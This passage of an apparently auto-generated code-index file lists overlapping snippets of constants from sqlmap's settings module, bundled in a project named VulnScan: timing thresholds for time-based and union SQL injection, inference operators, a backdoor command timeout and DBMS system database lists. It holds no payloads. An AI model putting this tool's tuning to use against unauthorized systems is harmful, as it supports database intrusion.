        "peekOfCode": "IP_ADDRESS_REGEX = r\"\\b(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\"\n# Regular expression used for recognition of generic \"your ip has been blocked\" messages\nBLOCKED_IP_REGEX = r\"(?i)(\\A|\\b)ip\\b.*\\b(banned|blocked|block list|firewall)\"\n# Dumping characters used in GROUP_CONCAT MySQL technique\nCONCAT_ROW_DELIMITER = ','\nCONCAT_VALUE_DELIMITER = '|'\n# Coefficient used for a time-based query delay checking (must be >= 7)\nTIME_STDEV_COEFF = 7\n# Minimum response time that can be even considered as delayed (not a complete requirement)\nMIN_VALID_DELAYED_RESPONSE = 0.5",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BLOCKED_IP_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BLOCKED_IP_REGEX = r\"(?i)(\\A|\\b)ip\\b.*\\b(banned|blocked|block list|firewall)\"\n# Dumping characters used in GROUP_CONCAT MySQL technique\nCONCAT_ROW_DELIMITER = ','\nCONCAT_VALUE_DELIMITER = '|'\n# Coefficient used for a time-based query delay checking (must be >= 7)\nTIME_STDEV_COEFF = 7\n# Minimum response time that can be even considered as delayed (not a complete requirement)\nMIN_VALID_DELAYED_RESPONSE = 0.5\n# Standard deviation after which a warning message should be displayed about connection lags\nWARN_TIME_STDEV = 0.5",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CONCAT_ROW_DELIMITER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CONCAT_ROW_DELIMITER = ','\nCONCAT_VALUE_DELIMITER = '|'\n# Coefficient used for a time-based query delay checking (must be >= 7)\nTIME_STDEV_COEFF = 7\n# Minimum response time that can be even considered as delayed (not a complete requirement)\nMIN_VALID_DELAYED_RESPONSE = 0.5\n# Standard deviation after which a warning message should be displayed about connection lags\nWARN_TIME_STDEV = 0.5\n# Minimum length of usable union injected response (quick defense against substr fields)\nUNION_MIN_RESPONSE_CHARS = 10",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CONCAT_VALUE_DELIMITER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CONCAT_VALUE_DELIMITER = '|'\n# Coefficient used for a time-based query delay checking (must be >= 7)\nTIME_STDEV_COEFF = 7\n# Minimum response time that can be even considered as delayed (not a complete requirement)\nMIN_VALID_DELAYED_RESPONSE = 0.5\n# Standard deviation after which a warning message should be displayed about connection lags\nWARN_TIME_STDEV = 0.5\n# Minimum length of usable union injected response (quick defense against substr fields)\nUNION_MIN_RESPONSE_CHARS = 10\n# Coefficient used for a union-based number of columns checking (must be >= 7)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TIME_STDEV_COEFF",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TIME_STDEV_COEFF = 7\n# Minimum response time that can be even considered as delayed (not a complete requirement)\nMIN_VALID_DELAYED_RESPONSE = 0.5\n# Standard deviation after which a warning message should be displayed about connection lags\nWARN_TIME_STDEV = 0.5\n# Minimum length of usable union injected response (quick defense against substr fields)\nUNION_MIN_RESPONSE_CHARS = 10\n# Coefficient used for a union-based number of columns checking (must be >= 7)\nUNION_STDEV_COEFF = 7\n# Length of queue for candidates for time delay adjustment",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_VALID_DELAYED_RESPONSE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_VALID_DELAYED_RESPONSE = 0.5\n# Standard deviation after which a warning message should be displayed about connection lags\nWARN_TIME_STDEV = 0.5\n# Minimum length of usable union injected response (quick defense against substr fields)\nUNION_MIN_RESPONSE_CHARS = 10\n# Coefficient used for a union-based number of columns checking (must be >= 7)\nUNION_STDEV_COEFF = 7\n# Length of queue for candidates for time delay adjustment\nTIME_DELAY_CANDIDATES = 3\n# Default value for HTTP Accept header",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WARN_TIME_STDEV",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "WARN_TIME_STDEV = 0.5\n# Minimum length of usable union injected response (quick defense against substr fields)\nUNION_MIN_RESPONSE_CHARS = 10\n# Coefficient used for a union-based number of columns checking (must be >= 7)\nUNION_STDEV_COEFF = 7\n# Length of queue for candidates for time delay adjustment\nTIME_DELAY_CANDIDATES = 3\n# Default value for HTTP Accept header\nHTTP_ACCEPT_HEADER_VALUE = \"*/*\"\n# Default value for HTTP Accept-Encoding header",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNION_MIN_RESPONSE_CHARS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNION_MIN_RESPONSE_CHARS = 10\n# Coefficient used for a union-based number of columns checking (must be >= 7)\nUNION_STDEV_COEFF = 7\n# Length of queue for candidates for time delay adjustment\nTIME_DELAY_CANDIDATES = 3\n# Default value for HTTP Accept header\nHTTP_ACCEPT_HEADER_VALUE = \"*/*\"\n# Default value for HTTP Accept-Encoding header\nHTTP_ACCEPT_ENCODING_HEADER_VALUE = \"gzip,deflate\"\n# Default timeout for running commands over backdoor",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNION_STDEV_COEFF",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNION_STDEV_COEFF = 7\n# Length of queue for candidates for time delay adjustment\nTIME_DELAY_CANDIDATES = 3\n# Default value for HTTP Accept header\nHTTP_ACCEPT_HEADER_VALUE = \"*/*\"\n# Default value for HTTP Accept-Encoding header\nHTTP_ACCEPT_ENCODING_HEADER_VALUE = \"gzip,deflate\"\n# Default timeout for running commands over backdoor\nBACKDOOR_RUN_CMD_TIMEOUT = 5\n# Number of seconds to wait for thread finalization at program end",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TIME_DELAY_CANDIDATES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TIME_DELAY_CANDIDATES = 3\n# Default value for HTTP Accept header\nHTTP_ACCEPT_HEADER_VALUE = \"*/*\"\n# Default value for HTTP Accept-Encoding header\nHTTP_ACCEPT_ENCODING_HEADER_VALUE = \"gzip,deflate\"\n# Default timeout for running commands over backdoor\nBACKDOOR_RUN_CMD_TIMEOUT = 5\n# Number of seconds to wait for thread finalization at program end\nTHREAD_FINALIZATION_TIMEOUT = 1\n# Maximum number of techniques used in inject.py/getValue() per one value",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_ACCEPT_HEADER_VALUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HTTP_ACCEPT_HEADER_VALUE = \"*/*\"\n# Default value for HTTP Accept-Encoding header\nHTTP_ACCEPT_ENCODING_HEADER_VALUE = \"gzip,deflate\"\n# Default timeout for running commands over backdoor\nBACKDOOR_RUN_CMD_TIMEOUT = 5\n# Number of seconds to wait for thread finalization at program end\nTHREAD_FINALIZATION_TIMEOUT = 1\n# Maximum number of techniques used in inject.py/getValue() per one value\nMAX_TECHNIQUES_PER_VALUE = 2\n# In case of missing piece of partial union dump, buffered array must be flushed after certain size",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_ACCEPT_ENCODING_HEADER_VALUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HTTP_ACCEPT_ENCODING_HEADER_VALUE = \"gzip,deflate\"\n# Default timeout for running commands over backdoor\nBACKDOOR_RUN_CMD_TIMEOUT = 5\n# Number of seconds to wait for thread finalization at program end\nTHREAD_FINALIZATION_TIMEOUT = 1\n# Maximum number of techniques used in inject.py/getValue() per one value\nMAX_TECHNIQUES_PER_VALUE = 2\n# In case of missing piece of partial union dump, buffered array must be flushed after certain size\nMAX_BUFFERED_PARTIAL_UNION_LENGTH = 1024\n# Maximum size of cache used in @cachedmethod decorator",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BACKDOOR_RUN_CMD_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BACKDOOR_RUN_CMD_TIMEOUT = 5\n# Number of seconds to wait for thread finalization at program end\nTHREAD_FINALIZATION_TIMEOUT = 1\n# Maximum number of techniques used in inject.py/getValue() per one value\nMAX_TECHNIQUES_PER_VALUE = 2\n# In case of missing piece of partial union dump, buffered array must be flushed after certain size\nMAX_BUFFERED_PARTIAL_UNION_LENGTH = 1024\n# Maximum size of cache used in @cachedmethod decorator\nMAX_CACHE_ITEMS = 256\n# Suffix used for naming meta databases in DBMS(es) without explicit database name",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "THREAD_FINALIZATION_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "THREAD_FINALIZATION_TIMEOUT = 1\n# Maximum number of techniques used in inject.py/getValue() per one value\nMAX_TECHNIQUES_PER_VALUE = 2\n# In case of missing piece of partial union dump, buffered array must be flushed after certain size\nMAX_BUFFERED_PARTIAL_UNION_LENGTH = 1024\n# Maximum size of cache used in @cachedmethod decorator\nMAX_CACHE_ITEMS = 256\n# Suffix used for naming meta databases in DBMS(es) without explicit database name\nMETADB_SUFFIX = \"_masterdb\"\n# Number of times to retry the pushValue during the exceptions (e.g. KeyboardInterrupt)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_TECHNIQUES_PER_VALUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_TECHNIQUES_PER_VALUE = 2\n# In case of missing piece of partial union dump, buffered array must be flushed after certain size\nMAX_BUFFERED_PARTIAL_UNION_LENGTH = 1024\n# Maximum size of cache used in @cachedmethod decorator\nMAX_CACHE_ITEMS = 256\n# Suffix used for naming meta databases in DBMS(es) without explicit database name\nMETADB_SUFFIX = \"_masterdb\"\n# Number of times to retry the pushValue during the exceptions (e.g. KeyboardInterrupt)\nPUSH_VALUE_EXCEPTION_RETRY_COUNT = 3\n# Minimum time response set needed for time-comparison based on standard deviation",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_BUFFERED_PARTIAL_UNION_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_BUFFERED_PARTIAL_UNION_LENGTH = 1024\n# Maximum size of cache used in @cachedmethod decorator\nMAX_CACHE_ITEMS = 256\n# Suffix used for naming meta databases in DBMS(es) without explicit database name\nMETADB_SUFFIX = \"_masterdb\"\n# Number of times to retry the pushValue during the exceptions (e.g. KeyboardInterrupt)\nPUSH_VALUE_EXCEPTION_RETRY_COUNT = 3\n# Minimum time response set needed for time-comparison based on standard deviation\nMIN_TIME_RESPONSES = 30\n# Maximum time response set used during time-comparison based on standard deviation",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CACHE_ITEMS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_CACHE_ITEMS = 256\n# Suffix used for naming meta databases in DBMS(es) without explicit database name\nMETADB_SUFFIX = \"_masterdb\"\n# Number of times to retry the pushValue during the exceptions (e.g. KeyboardInterrupt)\nPUSH_VALUE_EXCEPTION_RETRY_COUNT = 3\n# Minimum time response set needed for time-comparison based on standard deviation\nMIN_TIME_RESPONSES = 30\n# Maximum time response set used during time-comparison based on standard deviation\nMAX_TIME_RESPONSES = 200\n# Minimum comparison ratio set needed for searching valid union column number based on standard deviation",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "METADB_SUFFIX = \"_masterdb\"\n# Number of times to retry the pushValue during the exceptions (e.g. KeyboardInterrupt)\nPUSH_VALUE_EXCEPTION_RETRY_COUNT = 3\n# Minimum time response set needed for time-comparison based on standard deviation\nMIN_TIME_RESPONSES = 30\n# Maximum time response set used during time-comparison based on standard deviation\nMAX_TIME_RESPONSES = 200\n# Minimum comparison ratio set needed for searching valid union column number based on standard deviation\nMIN_UNION_RESPONSES = 5\n# After these number of blanks at the end inference should stop (just in case)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PUSH_VALUE_EXCEPTION_RETRY_COUNT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PUSH_VALUE_EXCEPTION_RETRY_COUNT = 3\n# Minimum time response set needed for time-comparison based on standard deviation\nMIN_TIME_RESPONSES = 30\n# Maximum time response set used during time-comparison based on standard deviation\nMAX_TIME_RESPONSES = 200\n# Minimum comparison ratio set needed for searching valid union column number based on standard deviation\nMIN_UNION_RESPONSES = 5\n# After these number of blanks at the end inference should stop (just in case)\nINFERENCE_BLANK_BREAK = 5\n# Use this replacement character for cases when inference is not able to retrieve the proper character value",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_TIME_RESPONSES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_TIME_RESPONSES = 30\n# Maximum time response set used during time-comparison based on standard deviation\nMAX_TIME_RESPONSES = 200\n# Minimum comparison ratio set needed for searching valid union column number based on standard deviation\nMIN_UNION_RESPONSES = 5\n# After these number of blanks at the end inference should stop (just in case)\nINFERENCE_BLANK_BREAK = 5\n# Use this replacement character for cases when inference is not able to retrieve the proper character value\nINFERENCE_UNKNOWN_CHAR = '?'\n# Character used for operation \"greater\" in inference",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_TIME_RESPONSES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_TIME_RESPONSES = 200\n# Minimum comparison ratio set needed for searching valid union column number based on standard deviation\nMIN_UNION_RESPONSES = 5\n# After these number of blanks at the end inference should stop (just in case)\nINFERENCE_BLANK_BREAK = 5\n# Use this replacement character for cases when inference is not able to retrieve the proper character value\nINFERENCE_UNKNOWN_CHAR = '?'\n# Character used for operation \"greater\" in inference\nINFERENCE_GREATER_CHAR = \">\"\n# Character used for operation \"greater or equal\" in inference",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_UNION_RESPONSES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_UNION_RESPONSES = 5\n# After these number of blanks at the end inference should stop (just in case)\nINFERENCE_BLANK_BREAK = 5\n# Use this replacement character for cases when inference is not able to retrieve the proper character value\nINFERENCE_UNKNOWN_CHAR = '?'\n# Character used for operation \"greater\" in inference\nINFERENCE_GREATER_CHAR = \">\"\n# Character used for operation \"greater or equal\" in inference\nINFERENCE_GREATER_EQUALS_CHAR = \">=\"\n# Character used for operation \"equals\" in inference",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_BLANK_BREAK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_BLANK_BREAK = 5\n# Use this replacement character for cases when inference is not able to retrieve the proper character value\nINFERENCE_UNKNOWN_CHAR = '?'\n# Character used for operation \"greater\" in inference\nINFERENCE_GREATER_CHAR = \">\"\n# Character used for operation \"greater or equal\" in inference\nINFERENCE_GREATER_EQUALS_CHAR = \">=\"\n# Character used for operation \"equals\" in inference\nINFERENCE_EQUALS_CHAR = \"=\"\n# Character used for operation \"not-equals\" in inference",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_UNKNOWN_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_UNKNOWN_CHAR = '?'\n# Character used for operation \"greater\" in inference\nINFERENCE_GREATER_CHAR = \">\"\n# Character used for operation \"greater or equal\" in inference\nINFERENCE_GREATER_EQUALS_CHAR = \">=\"\n# Character used for operation \"equals\" in inference\nINFERENCE_EQUALS_CHAR = \"=\"\n# Character used for operation \"not-equals\" in inference\nINFERENCE_NOT_EQUALS_CHAR = \"!=\"\n# String used for representation of unknown DBMS",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_GREATER_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_GREATER_CHAR = \">\"\n# Character used for operation \"greater or equal\" in inference\nINFERENCE_GREATER_EQUALS_CHAR = \">=\"\n# Character used for operation \"equals\" in inference\nINFERENCE_EQUALS_CHAR = \"=\"\n# Character used for operation \"not-equals\" in inference\nINFERENCE_NOT_EQUALS_CHAR = \"!=\"\n# String used for representation of unknown DBMS\nUNKNOWN_DBMS = \"Unknown\"\n# String used for representation of unknown DBMS version",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_GREATER_EQUALS_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_GREATER_EQUALS_CHAR = \">=\"\n# Character used for operation \"equals\" in inference\nINFERENCE_EQUALS_CHAR = \"=\"\n# Character used for operation \"not-equals\" in inference\nINFERENCE_NOT_EQUALS_CHAR = \"!=\"\n# String used for representation of unknown DBMS\nUNKNOWN_DBMS = \"Unknown\"\n# String used for representation of unknown DBMS version\nUNKNOWN_DBMS_VERSION = \"Unknown\"\n# Dynamicity boundary length used in dynamicity removal engine",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_EQUALS_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_EQUALS_CHAR = \"=\"\n# Character used for operation \"not-equals\" in inference\nINFERENCE_NOT_EQUALS_CHAR = \"!=\"\n# String used for representation of unknown DBMS\nUNKNOWN_DBMS = \"Unknown\"\n# String used for representation of unknown DBMS version\nUNKNOWN_DBMS_VERSION = \"Unknown\"\n# Dynamicity boundary length used in dynamicity removal engine\nDYNAMICITY_BOUNDARY_LENGTH = 20\n# Dummy user prefix used in dictionary attack",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_NOT_EQUALS_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_NOT_EQUALS_CHAR = \"!=\"\n# String used for representation of unknown DBMS\nUNKNOWN_DBMS = \"Unknown\"\n# String used for representation of unknown DBMS version\nUNKNOWN_DBMS_VERSION = \"Unknown\"\n# Dynamicity boundary length used in dynamicity removal engine\nDYNAMICITY_BOUNDARY_LENGTH = 20\n# Dummy user prefix used in dictionary attack\nDUMMY_USER_PREFIX = \"__dummy__\"\n# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_DBMS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNKNOWN_DBMS = \"Unknown\"\n# String used for representation of unknown DBMS version\nUNKNOWN_DBMS_VERSION = \"Unknown\"\n# Dynamicity boundary length used in dynamicity removal engine\nDYNAMICITY_BOUNDARY_LENGTH = 20\n# Dummy user prefix used in dictionary attack\nDUMMY_USER_PREFIX = \"__dummy__\"\n# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1\nDEFAULT_PAGE_ENCODING = \"iso-8859-1\"\ntry:",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_DBMS_VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNKNOWN_DBMS_VERSION = \"Unknown\"\n# Dynamicity boundary length used in dynamicity removal engine\nDYNAMICITY_BOUNDARY_LENGTH = 20\n# Dummy user prefix used in dictionary attack\nDUMMY_USER_PREFIX = \"__dummy__\"\n# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1\nDEFAULT_PAGE_ENCODING = \"iso-8859-1\"\ntry:\n    codecs.lookup(DEFAULT_PAGE_ENCODING)\nexcept LookupError:",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DYNAMICITY_BOUNDARY_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DYNAMICITY_BOUNDARY_LENGTH = 20\n# Dummy user prefix used in dictionary attack\nDUMMY_USER_PREFIX = \"__dummy__\"\n# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1\nDEFAULT_PAGE_ENCODING = \"iso-8859-1\"\ntry:\n    codecs.lookup(DEFAULT_PAGE_ENCODING)\nexcept LookupError:\n    DEFAULT_PAGE_ENCODING = \"utf8\"\n# Marker for program piped input",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_USER_PREFIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMMY_USER_PREFIX = \"__dummy__\"\n# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1\nDEFAULT_PAGE_ENCODING = \"iso-8859-1\"\ntry:\n    codecs.lookup(DEFAULT_PAGE_ENCODING)\nexcept LookupError:\n    DEFAULT_PAGE_ENCODING = \"utf8\"\n# Marker for program piped input\nSTDIN_PIPE_DASH = '-'\n# URL used in dummy runs",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_PAGE_ENCODING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_PAGE_ENCODING = \"iso-8859-1\"\ntry:\n    codecs.lookup(DEFAULT_PAGE_ENCODING)\nexcept LookupError:\n    DEFAULT_PAGE_ENCODING = \"utf8\"\n# Marker for program piped input\nSTDIN_PIPE_DASH = '-'\n# URL used in dummy runs\nDUMMY_URL = \"http://foo/bar?id=1\"\n# Timeout used during initial websocket (pull) testing",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "STDIN_PIPE_DASH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "STDIN_PIPE_DASH = '-'\n# URL used in dummy runs\nDUMMY_URL = \"http://foo/bar?id=1\"\n# Timeout used during initial websocket (pull) testing\nWEBSOCKET_INITIAL_TIMEOUT = 3\n# The name of the operating system dependent module imported. The following names have currently been registered: 'posix', 'nt', 'mac', 'os2', 'ce', 'java', 'riscos'\nPLATFORM = os.name\nPYVERSION = sys.version.split()[0]\nIS_WIN = PLATFORM == \"nt\"\n# Check if running in terminal",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_URL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMMY_URL = \"http://foo/bar?id=1\"\n# Timeout used during initial websocket (pull) testing\nWEBSOCKET_INITIAL_TIMEOUT = 3\n# The name of the operating system dependent module imported. The following names have currently been registered: 'posix', 'nt', 'mac', 'os2', 'ce', 'java', 'riscos'\nPLATFORM = os.name\nPYVERSION = sys.version.split()[0]\nIS_WIN = PLATFORM == \"nt\"\n# Check if running in terminal\nIS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n# DBMS system databases",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WEBSOCKET_INITIAL_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "WEBSOCKET_INITIAL_TIMEOUT = 3\n# The name of the operating system dependent module imported. The following names have currently been registered: 'posix', 'nt', 'mac', 'os2', 'ce', 'java', 'riscos'\nPLATFORM = os.name\nPYVERSION = sys.version.split()[0]\nIS_WIN = PLATFORM == \"nt\"\n# Check if running in terminal\nIS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n# DBMS system databases\nMSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLATFORM",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PLATFORM = os.name\nPYVERSION = sys.version.split()[0]\nIS_WIN = PLATFORM == \"nt\"\n# Check if running in terminal\nIS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n# DBMS system databases\nMSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", 